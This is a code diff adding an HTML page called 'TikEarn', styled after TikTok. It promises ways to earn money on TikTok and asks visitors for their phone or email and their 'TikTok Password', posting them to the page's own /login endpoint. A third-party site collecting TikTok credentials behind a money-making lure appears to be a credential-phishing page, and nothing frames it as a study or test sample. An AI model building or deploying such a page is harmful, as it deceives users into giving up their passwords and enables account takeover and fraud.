@@ -1,0 +1,116 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TikEarn</title>
+  <link href="https://fonts.googleapis.com/css2?family=Geologica&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Geologica', sans-serif;
+      background-color: #111;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    header {
+      width: 100%;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+    .logo {
+      font-size: 24px;
+      color: #ff0050;
+      font-weight: bold;
+    }
+    .banner {
+      font-size: 60px;
+      text-align: center;
+      margin: 40px 20px;
+      color: #fff;
+    }
+    .icon-row {
+      display: flex;
+      gap: 20px;
+      margin: 20px 0;
+      font-size: 32px;
+    }
+    .money-list {
+      list-style:none;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .form-container {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 40px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 15px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 250px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      width: 250px;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0050;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    footer {
+      margin-top: auto;
+      padding: 20px;
+      font-size: 14px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">TikEarn</div>
+  </header>
+  <div class="banner">Earn Money On TikTok</div>
+  <div class="icon-row">
+    <span>❤️</span>
+    <span>💬</span>
+    <span>📤</span>
+    <span>💰</span>
+  </div>
+  <div class="money-list">
+    <ul>
+      <li>Earn on TikTok by uploading videos</li>
+      <li>Earn through gifts and donations</li>
+      <li>Get brand deals</li>
+    </ul>
+  </div>
+  <div class="form-container">
+    <form method="post" action="/login">
+      <input type="text" name="username" placeholder="Phone or Email" required />
+      <input type="password" name="password" placeholder="TikTok Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+  <footer>© 2025 TikEarn. All rights reserved.</footer>
+</body>
+</html>
+
+
